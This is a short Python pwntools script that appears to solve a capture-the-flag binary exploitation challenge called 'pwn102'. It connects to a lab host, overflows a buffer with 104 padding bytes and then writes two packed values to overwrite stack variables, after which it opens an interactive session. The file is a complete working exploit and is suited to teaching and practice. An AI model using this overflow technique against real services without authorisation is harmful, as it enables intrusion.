#!/usr/bin/env python3

from pwn import *

# import struct

# Start the program
# binary = process("./pwn102-challenge_2.pwn102")

binary = remote("10.201.57.73", 9002)

# Create variables
coffee = p32(0x00C0FF33)
code = p32(0x0000C0D3)

response = binary.recvuntil(b"right? ")
print(response.decode("utf-8"))

binary.sendline((b"0" * 104) + code + coffee)

binary.interactive()
